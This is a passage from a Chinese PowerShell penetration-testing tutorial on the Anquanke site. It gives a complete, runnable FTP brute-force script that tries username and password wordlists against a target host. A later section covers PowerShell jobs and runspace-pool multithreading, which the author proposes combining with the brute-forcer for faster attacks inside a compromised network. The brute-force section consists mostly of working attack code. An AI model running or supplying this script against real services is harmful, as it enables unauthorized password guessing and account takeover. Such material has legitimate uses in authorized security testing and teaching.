那么我们进入到服务爆破的阶段, 那么我们端口扫描之后的一步必然就是进行服务的弱点攻击,
对于一些服务比如21FTP和数据库之类的服务进行爆破是安全测试必经的过程, 那么我们来以FTP服务爆破来举例

    
    
    function Invoke-BruteForce
    {
    <#
    ​
    .DESCRIPTION
    FTP服务爆破脚本
    ​
    .PARAMETER Computername
    主机名参数
    ​
    .PARAMETER UserList
    用户字典参数
    ​
    .PARAMETER PasswordList
    密码字典参数
    ​
    .PARAMETER Service
    服务名参数
    ​
    .PARAMETER StopOnSuccess
    找到密码时是否退出
    ​
    .PARAMETER Delay
    爆破时间间隔, 默认为0
    ​
    .EXAMPLE
    PS C:UsersrootclayDesktoppowershell> FTP-BruteForce -ComputerName localhost -UserList 
        C:UsersrootclayDesktoppowershelldictusername.txt -PasswordList 
        C:UsersrootclayDesktoppowershelldictpass.txt -Service ftp -verbose
    ​
    #>
        [CmdletBinding()] Param(
            [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
            [Alias("PSComputerName","CN","MachineName","IP","IPAddress","Identity","Url","Ftp","Domain","DistinguishedName")]
            [String]
            $ComputerName,
    ​
            [Parameter(Position = 1, Mandatory = $true)]
            [Alias('Users')]
            [String]
            $UserList,
    ​
            [Parameter(Position = 2, Mandatory = $true)]
            [Alias('Passwords')]
            [String]
            $PasswordList,
    ​
            [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("FTP")]
            [String]
            $Service = "FTP",
    ​
            [Parameter(Position = 4, Mandatory = $false)]
            [Switch]
            $StopOnSuccess,
    ​
            [Parameter(Position = 6, Mandatory = $false)]
            [UInt32]
            $Delay = 0
        )
        Begin {
            # 开始之前相关代码
        }
    ​
        Process
        {
            # Write-Verbose用于打印详细信息
            Write-Verbose "Starting Brute-Force and Delay is $Delay."
            
            # 获取用户名与密码字典
            $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
            $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
            if (!$usernames) { 
                $usernames = $UserList
                Write-Verbose "UserList file does not exist."
                Write-Verbose $usernames
            }
            if (!$passwords) {
                $passwords = $PasswordList
                Write-Verbose "PasswordList file does not exist."
                Write-Verbose $passwords
            }
    ​
            # Brute Force FTP
            if ($service -eq "FTP")
            {
                # 机器名的处理：若ftp://开始直接获取名字，若没有直接加上
                if($ComputerName -notMatch "^ftp://")
                {
                    $source = "ftp://" + $ComputerName
                }
                else
                {
                    $source = $ComputerName
                }
                Write-Output "Brute Forcing FTP on $ComputerName"
    ​
                :UsernameLoop foreach ($username in $usernames)
                {
                    foreach ($Password in $Passwords)
                    {
                        try
                        {   
                            # 调用.net中的FTP库进行连接
                            $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
                            $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
                            
                            # 通过Verbose输出的信息
                            Write-Verbose "Trying $userName : $password"
    ​
                            # 进行认证连接
                            $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
                            
                            # 获取返回信息
                            $result = $ftpRequest.GetResponse()
                            $message = $result.BannerMessage + $result.WelcomeMessage
                            
                            # 打印信息到控制台
                            Write-Output "Match $username : $Password"
                            $success = $true
    ​
                            # 判断是否要得到结果立刻退出
                            if ($StopOnSuccess)
                            {
                                break UsernameLoop
                            }
                        }
    ​
                        catch
                        {
                            $message = $error[0].ToString()
                            $success = $false
                        }
                        # 延时爆破
                        Start-Sleep -Seconds $Delay
                    }
                }
            } 
        }
    ​
        End {
            # 其他脚本运行结束代码
        }
    }

下面来看看爆破的结果:

![](https://p2.ssl.qhimg.com/t01611ffa4b4bb2960c.png)

如果不加-verbose参数显示是非常清爽的:

![](https://p4.ssl.qhimg.com/t0165ab1da0e4bb121b.png)

## powershell(6)-Multithreading

powershell的多线程是我们在使用powershell进行渗透过程中必须使用到的功能！为什么呢？试想，当你到达对方内网，你需要列出用户，或者下载文件等等操作的时候你是选择等待几天还是几分钟搞定呢？我们通过内存和CPU的占用来提高效率，也就是我们通常算法上说的用空间来换取时间。机器配置高，有的用，而不用就是浪费。

### powershell自带的Job

这里使用网上一个例子

    
    
    # 不使用多线程
    $start = Get-Date
    $code1 = { Start-Sleep -Seconds 5; 'A' }
    $code2 = { Start-Sleep -Seconds 5; 'B'}
    $code3 = { Start-Sleep -Seconds 5; 'C'}
    $result1,$result2,$result3= (& $code1),(& $code2),(& $code3)
    $end =Get-Date
    $timespan= $end - $start
    $seconds = $timespan.TotalSeconds
    Write-Host "总耗时 $seconds 秒."
    # 使用多线程
    $start = Get-Date
    $code1 = { Start-Sleep -Seconds 5; 'A' }
    $code2 = { Start-Sleep -Seconds 5; 'B'}
    $code3 = { Start-Sleep -Seconds 5; 'C'}
     
    $job1 = Start-Job -ScriptBlock $code1
    $job2 = Start-Job -ScriptBlock $code2
    $job3 = Start-Job -ScriptBlock $code3
     
    $alljobs =  Wait-Job $job1,$job2,$job3
    $result1,$result2,$result3 = Receive-Job $alljobs
     
    $end =Get-Date
     
    $timespan= $end - $start
    $seconds = $timespan.TotalSeconds
    Write-Host "总耗时 $seconds 秒."

那么可以测试到这两个脚本确实感觉上是使用了多线程，因为第二个版本使用时间只有9s左右的时间，但如果分来执行是需要15s的，就如第一个版本。那么这里是真的使用了多线程么？其实真实情况是多进程，最简单的查看方式，打开任务管理器，再执行脚本你可以看到多出3个powershell.exe的进程。那么我们可以用这个多进程么？是可以用，但是需要注意每个进程都需要跨进程交换数据，而且没有节流的机制，所以我们还是来看看真正的多线程吧。

### 多线程

直接来看一段代码

    
    
    $code = { Start-Sleep -Seconds 2; "Hello" }
    $newPowerShell = [PowerShell]::Create().AddScript($code)
    $newPowerShell.Invoke()

这样我们通过powershell的API运行一个代码块，就算是在一个进程内执行了代码，不会创建新的进程。这是单线程，那么如何多线程呢？下面的代码就可以实现啦，那么测试过程中推荐windows的`process
explorer`来查看进程对应的线程，可以清晰的看到创建的线程。

    
    
    ​
    # 设置线程限制为4，那么如果一起启动超过4线程就需要排队等待
    $throttleLimit = 4
    # 创建线程池
    $SessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
    $Pool = [runspacefactory]::CreateRunspacePool(1, $throttleLimit, $SessionState, $Host)
    $Pool.Open()
    # 代码块
     $ScriptBlock = {
         param($id)
     Start-Sleep -Seconds 2
         "Done processing ID $id"
     }
    $threads = @()
     ​
     # 创建40个线程
     $handles = for ($x = 1; $x -le 40; $x++) {
         $powershell = [powershell]::Create().AddScript($ScriptBlock).AddArgument($x)
         $powershell.RunspacePool = $Pool
         $powershell.BeginInvoke()
         $threads += $powershell
     }
    # 获取数据
     do {
       $i = 0
       $done = $true
       foreach ($handle in $handles) {
         if ($handle -ne $null) {
           if ($handle.IsCompleted) {
             $threads[$i].EndInvoke($handle)
             $threads[$i].Dispose()
             $handles[$i] = $null
           } else {
             $done = $false
           }
         }
         $i++
       }
       if (-not $done) { Start-Sleep -Milliseconds 500 }
     } until ($done)

大家可以试一试下面的代码和单独执行`get-hotfix`的速度差别：

    
    
    $throttleLimit = 40
    $SessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
    $Pool = [runspacefactory]::CreateRunspacePool(1, $throttleLimit, $SessionState, $Host)
    $Pool.Open()
    ​
    $ScriptBlock = {
        get-HotFix
    }
    $threads = @()
    $handles = for ($x = 1; $x -le 40; $x++) {
        $powershell = [powershell]::Create().AddScript($ScriptBlock)
        $powershell.RunspacePool = $Pool
        $powershell.BeginInvoke()
        $threads += $powershell
    }
    ​
    do {
      $i = 0
      $done = $true
      foreach ($handle in $handles) {
        if ($handle -ne $null) {
          if ($handle.IsCompleted) {
            $threads[$i].EndInvoke($handle)
            $threads[$i].Dispose()
            $handles[$i] = $null
          } else {
            $done = $false
          }
        }
        $i++
      }
      if (-not $done) { Start-Sleep -Milliseconds 500 }
    } until ($done)

那么以后大家需要执行的代码就写在脚本块区域即可。这里和前面的爆破脚本结合起来就是一个完美的爆破脚本和信息收集脚本。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **香山** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87976](/post/id/87976)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全](/tag/安全)
  * [powershell](/tag/powershell)
  * [攻击](/tag/攻击)

 **+1** __20赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t013f29aa557e44e67c.jpg) 香山

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

